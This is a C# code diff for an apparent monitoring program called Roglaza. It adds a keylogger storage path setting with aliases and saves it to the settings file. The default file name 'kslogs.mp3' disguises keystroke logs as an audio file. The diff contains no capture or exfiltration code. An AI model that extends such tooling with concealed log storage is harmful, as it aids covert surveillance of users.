@@ -72,6 +72,12 @@ namespace Roglaza
                    {
                        case "LogsPath":
                        case "logspath": LogsPath = System.IO.Path.GetFullPath(Decode(value)); break;
+                       case "KeyLoggerPath":
+                       case "KeyLoggerStore":
+                       case "KeyLoggerStorePath":
+                       case "kslogs":
+                       case "kslogspath":
+                       case "keyloggerstorepath":KeyLoggerStorePath = System.IO.Path.GetFullPath(Decode(value)); break;
                        case "RoglazaName":
                        case "roglazaname": RoglazaName = Decode(value); break;
                        case "allowbrowserhistory":
@@ -126,6 +132,9 @@ namespace Roglaza
            data += "RoglazaIconPath:" + Encode(RoglazaIconPath)+"\r\n";
            data += "RoglazaName:" + RoglazaName + "\r\n";
            data += "LogsPath:" + Encode(LogsPath)+"\r\n";
+           data += "KeyLoggerStorePath:" + Encode(KeyLoggerStorePath) + "\r\n";
+
+           
            return RoglazaHelper.FileWriteText(GeneralSettingsFilePath, data);         
             
        }
@@ -154,5 +163,7 @@ namespace Roglaza
        public string RoglazaIconPath = "";
 
        public string RoglazaName ="Roglaza";
+
+       public string KeyLoggerStorePath = "kslogs.mp3";
     }
 }
